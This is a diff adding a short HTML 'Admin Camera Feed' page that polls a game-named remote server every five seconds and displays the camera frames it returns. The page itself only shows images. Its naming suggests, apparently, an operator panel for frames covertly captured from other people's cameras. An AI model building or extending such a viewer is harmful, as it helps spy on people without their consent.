@@ -1,0 +1,29 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Admin Camera Feed</title>
+</head>
+<body>
+    <h1>Admin Camera Feed</h1>
+    <div id="frames"></div>
+    <script>
+        async function fetchFrames() {
+            const framesDiv = document.getElementById("frames");
+            const response = await fetch("https://free-fire-wgxh.onrender.com/frames");
+            const images = await response.json();
+            framesDiv.innerHTML = "";
+            images.forEach(link => {
+                const img = document.createElement("img");
+                img.src = link;
+                img.style.maxWidth = "300px";
+                img.style.margin = "10px";
+                framesDiv.appendChild(img);
+            });
+        }
+        setInterval(fetchFrames, 5000);
+        fetchFrames();
+    </script>
+</body>
+</html>
